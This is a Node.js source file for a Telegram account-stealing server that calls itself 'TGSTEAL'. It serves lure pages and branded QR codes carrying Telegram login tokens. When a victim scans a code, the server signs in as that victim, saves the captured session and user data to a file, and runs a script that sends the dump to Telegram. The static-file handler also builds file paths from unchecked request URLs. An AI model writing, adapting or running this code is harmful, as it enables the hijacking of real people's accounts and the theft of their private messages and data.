const http = require("http");
const https = require("https")
const dotenv = require('dotenv');
// import { TelegramClient } from "telegram";
const {TelegramClient} = require("telegram");
const { StringSession } = require("telegram/sessions");
const request=require('request');
const { spawn } = require('child_process');
const fs = require("fs");

const { QRCodeCanvas } = require("@loskir/styled-qr-code-node")

let Reset = "\x1b[0m"
let FgBlack = "\x1b[30m"
let FgRed = "\x1b[31m"
let FgGreen = "\x1b[32m"
let FgYellow = "\x1b[33m"
let FgBlue = "\x1b[34m"
let FgMagenta = "\x1b[35m"
let FgCyan = "\x1b[36m"
let FgWhite = "\x1b[37m"
let FgGray = "\x1b[90m"

dotenv.config()

const apiId = parseInt(process.env.APIID);
const apiHash = process.env.APIHASH;
const client = new TelegramClient(new StringSession(), apiId, apiHash);
let connected = false;

let lastLink = "";

let server = http.createServer();

server.on("request", async (req, res)=>{
    if(req.url == "/"){
        let bodyStream = fs.createReadStream("./web/index.html")
        res.writeHead(200, {
            "Content-type": "text/html"
        })
        bodyStream.pipe(res)
    }
    if(req.url == "/m"){
        let bodyStream = fs.createReadStream("./web/mobile.html")
        res.writeHead(200, {
            "Content-type": "text/html"
        })
        bodyStream.pipe(res)
    }

    // ^^^ im so bad in html sorry

    if(req.url.match(/static/)){
        let bodyStream = fs.createReadStream(`./web${req.url}`)
        res.writeHead(200, {
            "Content-type": "image/png"
        })
        bodyStream.pipe(res)
    }
    if(req.url == "/getQR"){
        if (connected == true) {
            res.writeHead(200, {'Content-Type': 'text/plain' });
            res.end(lastLink);
            return;
        };
        connected = true;
        await client.connect()
        try{
            const user = await client.signInUserWithQrCode(
            { apiId, apiHash },
            {
                onError: async function (p1) {
                console.log("error", p1);
                // return true;a
                },
                qrCode: async (code) => {
                console.log(FgGreen+"[TGSTEAL] Generated QrCode link:");
                const urlLink = `tg://login?token=${code.token.toString("base64")}`;
                body = urlLink
                lastLink = urlLink
                var img = fs.readFileSync('./qr.png');
                res.writeHead(200, {'Access-Control-Allow-Origin': '*', /* @dev First, read about security */
                'Access-Control-Allow-Methods': 'OPTIONS, POST, GET',
                'Access-Control-Max-Age': 2592000, 'Content-Type': 'text/plain'});
                res.end(body);
                
                console.log(urlLink, Reset);
                },
            }
            );
            try {
                sessionFileName = `${user.phone}_tg.session`

                fs.writeFileSync(sessionFileName, JSON.stringify({
                    "session": client.session.save(),
                    "user": user.toJSON()
                }, undefined, 4))

                console.log(FgGreen + "[TGSTEAL] Sending dump to telegram! Please be patient...", Reset)

                pythonProcess = spawn("../.venv/bin/python3", ["./dump.py", sessionFileName])} catch(err) {FgRed, "[ERROR]", err, Reset}

            connected = false} catch {console.log("TGBot Error!");}
        client.destroy()
    }
    if(req.url.match("/gen&")){
        let qrCode = new QRCodeCanvas({
            width: 240,
            height: 240,
            type: "svg",
            data: req.url.split("&")[1],
            image: "./web/static/telegram-3-xxl.png",
            dotsOptions: {
                color: "#ffffff",
                type: "rounded"
            },
            backgroundOptions: {
                color: "#212121",
            },
            imageOptions: {
                crossOrigin: "anonymous",
                margin: 5,
                imageSize: 1
            },
            cornersSquareOptions: {
                color: "#ffffff",
                type: "extra-rounded"
            },
            qrOptions:{
                errorCorrectionLevel: "L"
            }
        })
        res.writeHead(200, {"Content-type": "image/png"}).end(await qrCode.toBuffer("png"))
    }
})

server.listen(8080)

// console.log(apiId, apiHash)
